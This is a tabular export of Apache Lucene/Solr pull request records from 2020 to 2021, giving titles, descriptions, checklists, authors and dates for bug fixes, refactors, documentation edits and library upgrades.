"","2158","LUCENE-9645: Delete useless variable negativeDeltas in BKDReader$IndexTree","# Description variable `negativeDeltas` In BKDReader$IndexTree can be replaced by `isLeft` which is function parameter. we don't use `negativeDeltas` in other place.  # Checklist - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes, I have no idea how to test it.","closed","","kkewwei","2020-12-20T11:47:48Z","2020-12-21T10:10:50Z"
"","2141","LUCENE-9346: Support minimumNumberShouldMatch in WANDScorer","# Description Support minimumNumberShouldMatch in WANDScorer  Currently has a few `nocommit` to keep track of questions  # Solution Similar to `MinShouldMatchSumScorer`, the logic here keeps track of number of matched scorers for each candidate doc, and compares it with `minShouldMatch` to decide if the minimum number of optional clauses have been matched.  # Tests Passed existing tests (especially those in `TestBooleanMinShouldMatch` and `TestWANDScorer`), and updated some that check for scores.  `./gradlew check` passed with `nocommit` rule commented out for now.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","zacharymorn","2020-12-11T04:04:24Z","2021-01-14T06:53:06Z"
"","2140","UCENE-9346: Support minimumNumberShouldMatch in WANDScorer","# Description Support minimumNumberShouldMatch in WANDScorer  Currently has a few `nocommit` to keep track of questions  # Solution Similar to `MinShouldMatchSumScorer`, the logic here keeps track of number of matched scorers for each candidate doc, and compares it with `minShouldMatch` to decide if the minimum number of optional clauses have been matched.  # Tests Passed existing tests (especially those in `TestBooleanMinShouldMatch` and `TestWANDScorer`), and updated some that check for scores.  `./gradlew check` passed with `nocommit` rule commented out for now.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","zacharymorn","2020-12-11T04:00:29Z","2020-12-11T04:03:29Z"
"","2275","SOLR-15123: Make all Tool option descriptions follow the same general pattern.","# Description different people have written different SolrCLI tools over time, and it shows in the user help.   # Solution Copy edit all the tool options.  # Tests  Just docs.   In fact, it appears tools don't have tests.  ;-(","closed","","epugh","2021-01-29T23:01:31Z","2021-02-05T20:17:59Z"
"","1923","SOLR-14900: Reference Guide build cleanup/module upgrade","# Description buildSite task was generating some scary warnings on first build as it was getting various gems as well as a warning on each build. It was version locked before due to ant and PDF, but that's no longer part of Solr 9.  # Solution Upgraded all explicit versions to the latest available. Everything seems to build the same, the only changes were for the source block styles. We were supposed to be using thankful-eyes theme but the correct name of that theme is actually thankful_eyes and it is a dark theme, so we were falling back to 'github' theme. Made that more clear and explicit. Switched to using stylesheets as well instead of embedded styles, as upgrade module was generating more markup for better dark-themes support (I guess).  There is still an old warning during build about _Illegal reflective access_ and a new one about _Improper use of Lexer#lex_ . It may be worth repeating the upgrade process in another couple of months to see if that had been fixed in relevant libraries.  # Tests There were no code changes, but I visually and 'diff' checked the old and new html output.  # Checklist  Please review the following and check all that apply:  - [X I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X] I have created a Jira issue and added the issue ID to my pull request title. - [X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X] I have developed this patch against the `master` branch. - [X] I have run `./gradlew check`.","open","","arafalov","2020-09-27T15:24:33Z","2020-10-09T18:44:51Z"
"","1960","SOLR-14659: Remove restlet as dependency for the ManagedResource API (backport to 8.x)","# Description Backport of e879a52291ef7dcd0514e7419d811b6ff800bcce to remove restlet as a dependency.  # Solution  Please provide a short description of the approach taken to implement your solution.  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","thelabdude","2020-10-07T20:04:15Z","2020-10-07T20:17:37Z"
"","1978","LUCENE-9524: Fix NPE in SpanWeight#explain when no scoring is require…","# Description `SpanWeight#explain` uses `Similarity.SimScorer` to generate explanations, and may fail with NullPointerException when scoring is not needed and thus `Similarity.SimScorer` is set to null, such as matching for must not occur span query.  # Solution The solution is to check for null `Similarity.SimScorer` in `SpanWeight#explain`, and provides alternative explanation.  # Tests Added 1 integration test to `TestMemoryIndex` that was broken before the fix.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","zacharymorn","2020-10-13T04:56:52Z","2020-10-16T17:20:51Z"
"","2012","SOLR-14935: Solr can forward request ( remoteQuery ) even if there are local cores present","# Description  When querying using SolrJ today this is what happens -  - CloudSolrClient creates a list of all replicas from the alias ( after resolving it ) and then shuffles the list picking one Solr node to query against - When Solr receives the request, it only looks at the first collection from the alias and tries to find a local core - Anytime that isn't the case, it makes a remoteQuery ,  proxying the request to machineX which has a local core of the first collection from the alias.  # Solution  The solution involves trying to find a local core by looking at all the collections in the list and not just the first collection. this is a cheap operation and saves the overhead of an extra network hop  # Tests   # Performance  I was lucky enough to have a cluster which had exact production characteristics but was in dark mode. So we were able to test this change out internally and check out it's effectiveness   After a rolling restart of the cluster we saw the CPU idle percentage increase by roughly 10%  ![image](https://user-images.githubusercontent.com/158041/96658582-ba7f6580-12f9-11eb-9c42-a88356d10e36.png)   This improved the end to end latency as well. The graph purposely doesn't have the Y axis but it's a stack graph that buckets latency ( for example what % queries fall bellow 100ms etc ) . So the base green and yellow lines increasing means we are able to serve queries faster.  ![image](https://user-images.githubusercontent.com/158041/96658338-172e5080-12f9-11eb-9a74-e7a547972248.png)  I don't expect the latency improvements to be this drastic for everyone. In our specific case we had 2 things that really improved with this change  1. We have ~15 collections in an alias. So there was only a 14/15 times the query would end up being a remote query for searches 2. These remoteQueries were going through PKI authentication and not BasicAuth ( we use `forwardCredentals=true` ) . In our flame graphs we had seen this take a significant percentage of wall clock time ( 30% ) .  ![image](https://user-images.githubusercontent.com/158041/96658881-89ebfb80-12fa-11eb-916d-64171b581c61.png)  When we made the change to use `forwardCredentals=true` we saw this reduce to  ![image](https://user-images.githubusercontent.com/158041/96658948-ad16ab00-12fa-11eb-9612-864db2bf715b.png)   It is when we saw PKIAuth still show up in the flemagraph that we noticed `remoteQuery` being the reason  After the rollout of this PR this PKI isn't visible in the flamegraph at all 🎉   ![image](https://user-images.githubusercontent.com/158041/96659068-e94a0b80-12fa-11eb-9272-30aa2246d143.png)  # Checklist  Please review the following and check all that apply:  - [ ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ ] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","vthacker","2020-10-21T00:39:54Z","2021-11-19T00:45:30Z"
"","2118","SOLR-15031: Prevent null being wrapped in a QueryValueSource","# Description  When parsing a sub query in a function query, FunctionQParser#parseValueSource does not check if the produced query object is null. When it is, it just wraps a null in a QueryValueSource object. This is a cause for NPE's in code consuming that object. Parsed queries can be null, for example when the query string only contains stopwords, so we need handle that condition.  # Solution  Added a null check to FunctionQParser#parseValueSource  # Tests  The problem can be reproduced via: 1. Start solr with the techproducts example collection: solr start -e techproducts 2. Add a stopword to SOLR_DIR/example/techproducts/solr/techproducts/conf/stopwords.txt, for example ""at"" 3. Execute a function query: http://localhost:8983/solr/techproducts/select?fieldquery={!field%20f=features%20v=%27%22at%22%27}&q={!func}%20if($fieldquery,1,0)  After applying this PR the NPE is gone.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","vonbox","2020-12-04T09:58:36Z","2021-03-03T10:57:31Z"
"","1897","SOLR-9607: Finalize move of Terms component and request handler into the implicit definitions","# Description  We moved Terms Components and Terms Request Handler into default definition, but the request handler did not define any defaults. Therefore, we still had an overriding definition hanging around in solrconfig.xml, confusing things. Additionally, documentation was out of date too.  # Solution  1. Updated default definition for /terms request handler to match what solrconfig.xml had (terms=true to actually make that handler useful and distrib=false) 2. Removed definition from default configsets 3. Cleaned up tests that no longer needed to enable the component every time 4. Updated documentation to reflect the implicit aspects and to give an example of using it with other handlers  # Tests 1. No new tests, but updated the existing ones to rely on updated definition and not to declare it explicitly.  # Checklist  Please review the following and check all that apply:  - [X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X] I have created a Jira issue and added the issue ID to my pull request title. - [X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X] I have developed this patch against the `master` branch. - [X] I have run `./gradlew check`. - [X] I have added (updated) tests for my changes. - [X] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","arafalov","2020-09-20T18:35:23Z","2020-09-21T13:05:37Z"
"","2311","SOLR-15141: Remove V2RequestSupport SolrJ interface","# Description  V2RequestSupport was intended to allow support for v2 requests in SolrJ, but was never really adopted on a critical mass of SolrRequest implementations.  Now that the v2 API has had more time to mature, there are better approaches for supporting v2 APIs in SolrJ.  # Solution  Removes V2RequestSupport interface from SolrJ.  # Tests  N/A  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","gerlowskija","2021-02-07T03:35:11Z","2021-05-03T18:07:12Z"
"","2312","SOLR-15141: Deprecate V2RequestSupport","# Description  V2RequestSupport was intended to allow support for V2 requests in SolrJ, but never gained a critical mass of SolrRequest implementations.  Now that the V2 API is more mature there are better ways to support v2 requests in the API.  # Solution  Deprecate V2RequestSupport for subsequent removal in 9.0  # Tests  N/A  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have run `./gradlew check`. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","gerlowskija","2021-02-07T03:37:52Z","2021-02-23T01:40:52Z"
"","2008","SOLR-14951: Upgrade Angular JS 1.7.9 to 1.8.0","# Description  Upgrade Angular JS 1.7.9 to 1.8.0","closed","","risdenk","2020-10-20T00:42:36Z","2020-12-22T17:20:40Z"
"","1999","SOLR-14943 Rework Monitoring Solr with Prometheus and Grafana ref guide to be clearer","# Description  Update the ref guide based on going through the documentation and setting it up for the first time myself.  # Solution  Some fixes to example code, some transitions for folks like myself who don't know about these tools already!","closed","","epugh","2020-10-17T13:40:59Z","2020-10-20T01:50:08Z"
"","2146","SOLR-15049: Add TopLevelJoinQuery optimization for 'self-joins'","# Description  TopLevelJoinQuery currently converts ordinals of the ""from"" field into ordinals of the ""to"" field, even when the ""from"" and ""to"" field are the same and have the same ordinals.  By handling this special case we can greatly improve search performance for this subset of joins.  # Solution  This commit adds a new subclass ""TopLevelJoinQuery.SelfJoin"", which skips the ordinal-conversion step in typical ""top-level"" joins.   # Tests  Manual testing, along with beasting of TestJoin.java.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [x] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","gerlowskija","2020-12-15T02:31:02Z","2020-12-22T13:32:53Z"
"","2096","SOLR-15015: added support to parametric Interleaving algorithm","# Description  This pull requests add a parameter 'interleavingAlgorithm' in Learning To Rank to specify the Interleaving algorithm to use (Only TeamDraft supported) # Solution  Added the parameter and defaults  # Tests  Added a new test class for the  LTR QueryParser, related with interleaving parameters # Checklist  Please review the following and check all that apply:  - [X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X] I have created a Jira issue and added the issue ID to my pull request title. - [X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X] I have developed this patch against the `master` branch. - [X] I have run `./gradlew check`. - [X] I have added tests for my changes. - [X] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","alessandrobenedetti","2020-11-23T19:03:04Z","2020-11-24T10:11:23Z"
"","2227","SOLR-13105 - Visual Guide to Math Expressions","# Description  This PR supersedes #2211 and should provide a cleaner merge of the original `visual-guide` branch and my later copy edits.","closed","","ctargett","2021-01-20T18:51:43Z","2021-01-20T22:14:02Z"
"","2250","SOLR-13608: Incremental backup file format","# Description  This PR introduces a new way for Solr to do backups (with a new underlying file structure).  This new ""incremental"" backup process improves over the existing backup mechanism in several ways:  - multiple backups ""points"" can now be stored at a given backup   location/name, allowing users to choose which point in time they want   to restore - subsequent backups skip over uploading files that were uploaded by   previous backups, saving time and network time. - files are checksummed as they're uploaded, ensuring that corrupted   indices aren't persisted and accidentally restored later.  This PR is the first piece of SIP-12 - see the proposal for more context.  # Tests  Manual testing.  New unit tests.  New ""integration"" tests in HdfsCloudIncrementalBackupTest, LocalFSCloudIncrementalBackupTest, and HdfsBackupRepositoryIntegrationTest.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","gerlowskija","2021-01-26T18:40:52Z","2021-02-22T21:01:14Z"
"","2114","SOLR-12182: Don't persist base_url in ZK as the scheme is variable, compute from node_name instead ~ Backport to 8x","# Description  This is the backport to 8x from master, original PR was #2010  See JIRA for description of the issue: https://issues.apache.org/jira/browse/SOLR-12182  # Solution  This PR computes the `base_url` for a Replica using the stored `node_name` and a global `urlScheme` rather than storing the `base_url` in `state.json`. This avoids storing an incorrect URL scheme for replicas in persistent storage. The `base_url` is computed when read back from ZK and dropped when marshaling the Replica state to JSON. This also means we don't need a migration tool as stored state is ""healed"" on-the-fly when read back from ZK.  The unfortunate aspect of this PR is we need to keep the URL scheme for the cluster in a global variable (so that it is available when reading from ZK). The global `urlScheme` still comes from the cluster property but is then stored in a global singleton, see: `org.apache.solr.common.cloud.UrlScheme`. Alternatively, we could just keep the `urlScheme` in a static in ZkStateReader, I felt the global singleton `UrlScheme.INSTANCE` made it clearer that this was a global thing but it also made more sense with my first implementation that tried to make rolling restart upgrades to TLS less chaotic. It's a trivial change to move all this over to ZkStateReader and remove UrlScheme.  I initially tried setting a `ThreadLocal` that gives access to the `urlScheme` whenever we need to read these props from ZK. However, that ended up being problematic because we tend to read ZkNodeProps from ZK in many places. In reality, the `urlScheme` really is an immutable global variable that should be set once during initialization by reading from the cluster property stored in ZK. So I felt trying to treat this global as something that was highly dynamic made the code overly cumbersome. Put simply, we shouldn't support `urlScheme` changing in a live node after initialization, it's bad for business.  I also tried to get rid of the `urlScheme` cluster property (re: https://issues.apache.org/jira/browse/SOLR-10202) but I'm not sure how SolrCloud client applications can resolve the correct `urlScheme` for the cluster without this property? On the server-side, sure we can just get the `urlScheme` from a Java System Property, but that won't be set for remote client applications that initialize via a connection to ZooKeeper. So I'm keeping the cluster property `urlScheme` for now.  We also need to consider how to enable TLS on an existing cluster (with active collections) using a rolling restart process. The current `org.apache.solr.cloud.SSLMigrationTest` just stopped all test nodes at once and then brought them back with TLS enabled.  Based on feedback, I've since removed the option to pull the active urlScheme from live nodes as we're not able to ensure zero-downtime when moving from `http` -> `https` for clusters with existing collections and live traffic. Put simply, the feature was a bit trappy in that it tried to reduce chaos when doing a rolling restart to enable TLS, but it made no guarantees. Thus, users just need to be sure to enable TLS before building production clusters!  Lastly, I've tried to clean-up some of the places that access the baseUrl on replicas to be more consistent, so you'll see some of that in this PR as well.  # Tests  Many existing tests cover regression caused by these code changes. Added simple unit test for UrlScheme.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","thelabdude","2020-12-02T16:40:30Z","2020-12-02T18:00:31Z"
"","2557","LUCENE-10059: Fix AssertionError in JapaneseTokenizer backtrace","# Description  This is a backport of https://github.com/apache/lucene/pull/254  There is an issue which causes an `AssertionError` in the backtrace step of `JapaneseTokenizer`. If there is a text span of length 1024 (determined by `MAX_BACKTRACE_GAP`) where the regular backtrace is not called, a forced backtrace will be applied. If the partially best path at this point happens to end at the last pos, and since there is always a final backtrace applied at the end, the final backtrace will try to backtrace from and to the same position, causing an AssertionError in `RollingCharBuffer.get()` when it tries to generate an empty buffer.","closed","","dungba88","2021-08-20T14:47:47Z","2021-08-23T12:19:43Z"
"","1989","SOLR-14549 - Fix listing of Files in a Directory on Solr Admin UI","# Description  This fixes the listing of Files in a directory in the Solr Admin UI  # Solution  * Ensure that jstree can update data behind the scenes * Fix file jstree object to represent open/closed correctly * Upgrade jstree to 3.3.10 for compatibility with JQuery 3.5.x  # Tests  * Manually built Solr and checked that reported issue is no longer visible. * `./gradlew check -x test`  # Checklist  Please review the following and check all that apply:  - [X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X] I have created a Jira issue and added the issue ID to my pull request title. - [X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X] I have developed this patch against the `master` branch. - [X] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","risdenk","2020-10-15T20:22:59Z","2020-10-19T13:42:27Z"
"","1687","SOLR-14658: Fix colstatus solrj interfaces to return one or all collections","# Description  This fixes a bug in the solrj interface for the [COLSTATUS collection api](https://lucene.apache.org/solr/guide/8_6/collection-management.html#colstatus) as detailed in the [JIRA](https://issues.apache.org/jira/browse/SOLR-14658) such that using the class CollectionAdminRequest.collectionStatus(collectionName) to issue colstatus commands would return all collections vs just the one specified. This is an issue as the operation sends a request to all collections' shard leaders.   # Solution  CollectionAdminRequest.collectionStatus(collectionName) will now only return one collection. To support getting the status for all collections, I've added CollectionAdminRequest.collectionStatuses(). The documented API still works exactly as it is detailed.  # Tests  I've added a new test case to test these new interfaces. I've also provided a snippet of code and steps for manual validation in the JIRA (to repro the bug) but i can be used to test the fix as well: ```     String host = ""http://localhost:8983/solr"";     HttpSolrClient.Builder builder = new HttpSolrClient.Builder(host);     HttpSolrClient solrClient = builder.build();      String collection = ""tes"";     final NamedList response =        //solrClient.request(CollectionAdminRequest.collectionStatus(collection));       solrClient.request(CollectionAdminRequest.collectionStatuses());       response._forEachEntry((k,v) -> {         System.out.println(k);       });     System.out.println(response); ``` Using just the API and not solrj for verification: - http://localhost:8983/solr/admin/collections?action=COLSTATUS&collection=tester1   - return one collection - http://localhost:8983/solr/admin/collections?action=COLSTATUS   - return all collections  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `ant precommit` and the appropriate test suite. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","andyvuong","2020-07-22T18:50:50Z","2020-09-03T18:25:37Z"
"","1681","SOLR-10804: Allow same version updates in DocBasedVersionConstraintsProcessor","# Description  This change adds an optional configuration parameter to the `DocBasedVersionConstraintsProcessorFactory` which will allow updates to proceed if they have the same version as the existing document.  # Solution  1. Added a boolean parameter named `rejectSameVersion` which defaults to true. This is the original behaviour. 2. Based on the parameter the `DocBasedVersionConstraintsProcessor` will choose the correct strategy for comparing the versions in the new and existing documents. 3. The decision of which strategy to use is done up front so as to not check on every document update.  I chose the name `rejectSameVersion` because it seemed to fit with the documentation better as it talks more about rejecting updates than accepting them. Happy to to adjust this based on your feedback.  Edit: I realized i made an error by removing the protected method; so I've updated the PR to include it back in again. 👀   # Tests  Added a test to check that setting `rejectSameVersion` to `false` has the following behaviour: - Cannot update the document with an older version - Can update document with the same version - Can update document with a new version  All previous unit tests which rely on the default value of `true` pass.  # Checklist  Please review the following and check all that apply:  - [✅] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [✅] I have created a Jira issue and added the issue ID to my pull request title. - [✅] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [✅] I have developed this patch against the `master` branch. - [✅] I have run `ant precommit` and the appropriate test suite. - [✅] I have added tests for my changes. - [✅] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","squirmy","2020-07-20T08:08:12Z","2020-08-07T04:02:20Z"
"","1988","SOLR-14483","# Description  This builds on the work started in PR #1985   # Solution  Update to the CSS and JS to fix functionality.  # Tests  Manually tested.  # Checklist  Please review the following and check all that apply:  - [X ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ X] I have created a Jira issue and added the issue ID to my pull request title. - [X ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ X] I have developed this patch against the `master` branch. - [ X] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","hacktoberfest-accepted,","epugh","2020-10-15T18:08:16Z","2020-10-20T01:50:11Z"
"","2304","SOLR-15133: Document how to eliminate Failed to reserve shared memory warning","# Description  The warning is annoying if you know what it is, and alarming if you don't!    # Solution  Add to the Docker FAQ how to disable it.    Eventually this might feed the Ref Guide!  # Tests  Doc only  # Checklist  Please review the following and check all that apply:  - [X ] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X ] I have created a Jira issue and added the issue ID to my pull request title. - [X ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X ] I have developed this patch against the `master` branch. - [X ] I have run `./gradlew check`. - [X ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","epugh","2021-02-04T16:17:04Z","2021-02-04T21:15:44Z"
"","1947","SOLR-14887 Upgrade JQuery to 3.5.1","# Description  The Solr admin UI currently uses JQuery 3.4.1 (SOLR-14209). JQuery 3.5.1 is out and addresses some security vulnerabilities. It would be good to upgrade.  # Solution  Upgraded JQuery to 3.5.1  # Tests  Manually tested the UI.  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","gezapeti","2020-10-05T13:55:52Z","2020-10-13T23:41:57Z"
